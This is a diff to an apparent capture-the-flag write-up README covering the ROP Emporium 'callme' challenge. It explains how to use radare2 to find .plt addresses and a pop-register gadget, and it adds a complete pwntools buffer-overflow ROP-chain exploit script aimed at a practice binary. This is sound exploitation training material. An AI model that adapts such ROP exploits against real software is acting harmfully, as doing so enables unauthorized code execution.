@@ -5,9 +5,9 @@
 | Challenge          | Walkthrough                                                                                     |
 | ------------       | --------                                                                                        |
 | [Ret2Win](#ret2win)| [pdf](https://github.com/Ordered-Chaos/Pwnfolio/blob/master/ROP_Emporium/Writeups/Ret2win64.pdf)|
-| [Split](#split)    | [pdf](https://github.com/Ordered-Chaos/Pwnfolio/blob/master/ROP_Emporium/Writeups/Split64.pdf)  |                                                                              
-| CallMe             |                                                                                                 |
-| Write4             |                                                                                                 |
+| [Split](#split)    | [pdf](https://github.com/Ordered-Chaos/Pwnfolio/blob/master/ROP_Emporium/Writeups/Split64.pdf)  |                                                         
+| [CallMe](#callme)  | [pdf](https://github.com/Ordered-Chaos/Pwnfolio/blob/master/ROP_Emporium/Writeups/Callme64.pdf) |
+| Write4             | pdf                                                                                                |
 
 ***
 
@@ -117,44 +117,46 @@ print(flag)
 
 > ## 1. Problem
 >> In order to get the flag in the callme challenge, there are 3 functions that need
->> to be called in order with the arguments *0xdeadbeef, 0xdoodfood, and 0xcafebabe*. 
+>> to be called in order. Each function must be called with with the arguments 
+>> *0xdeadbeef, 0xdoodfood, and 0xcafebabe*. 
 
 > ## 2. Solution
 >> One important point to note is that the functions will have to be called with their
->> .plt address as opposed to their offset. This challanged will be the first in which
+>> *.plt* address as opposed to their offset. This challanged will be the first in which
 >>  a legitimate rop chain will be used. The goal here will be too:
->> - [ ] ** Find the .plt addresses of the 3 required functions **
+>> - [ ] **Find the *.plt* addresses of the 3 required functions**
+>>> In radare2, the `> afl` command lists the function along with their *.plt* addresses.
+>>> All that needs to be done is to note these addresses.
 >>> 
->>> 
->>> 
->> - [ ] ** Locate a rop gadget or chain of gadgets that can hold the arguments
->>> 
->>> 
->>> 
->> - [ ] ** Create and execute a script that can chain all of the elements together
->>> 
->>> 
->>> 
+>> - [ ] **Locate a rop gadget or chain of gadgets that can hold the arguments**
+>>> In 64 bit systems, the first 6 arguments to a function call are passed in the *rdi, rsi, rdx, rcx, 
+>>> r8, r9* registers in that order. Using the `> /R pop rdi;` command in radare2 you're able to to see a list rop gadget
+>>> chains that start with the `pop rdi` instruction. In this binary, there happens to 
+>>> be a `pop rdi; pop rsi; pop rdx; ret;` chain which is perfect for handling the 3 arguments.
+>>>
+>> - [ ] **Create and execute a script that chains all of the elements together**
+>>> As a matter of course, I created a pwntools script to automate the exploit.
+
 ~~~python
 
 #!/usr/bin/env python
 
 from pwn import *
 
-elf = context.binary = ELF('callme')  # setting up the envronment
+elf = context.binary = ELF('callme')  # setting up the environment
 context.log_level = 'debug'       
 
-padding = cyclic(40)
-para1 = p64(0x)
-para2 = p64(0x)
-para3 = p64(0x)
-rop = p64(0x)
-callme1 = p64(0x)
-callme2 = p64(0x)
-callme3 = p64(0x)
+padding = cyclic(40)                  # junk to fill up buffer
+para1 = p64(0xdeadbeefdeadbeef)       # first function arg 
+para2 = p64(0xcafebabecafebabe)       # second function arg
+para3 = p64(0xd00df00dd00df00d)       # third function arg
+rop = p64(0x40093c)                   # pop rdi; pop rsi; pop rdx; ret;
+callme1 = p64(0x400720)               # .plt of first function call  
+callme2 = p64(0x400740)               # .plt of second function call
+callme3 = p64(0x4006f0)               # .plt of third function call
 
-payload = padding                    # junk to fill up buffer
-payload += rop
+payload = padding                     # junk to fill up buffer
+payload += rop                        # start of ROP Chain
 payload += para1
 payload += para2
 payload += para3
@@ -168,11 +170,16 @@ payload += rop
 payload += para1
 payload += para2
 payload += para3
-payload += callme3
+payload += callme3                    # end of ROP chain 
 
 io = process(elf.path)
-io.sendline(payload)                 # sends payload
+io.sendline(payload)                  # sends payload
 io.wait_for_close()                  
-io.recvall()
+flag = io.recvall()                   # receive output
+print(flag)                           # print flag!
 
 ~~~
+
+**FLAG:**  *ROPE{a_placeholder_32byte_flag!}* 
+
+***
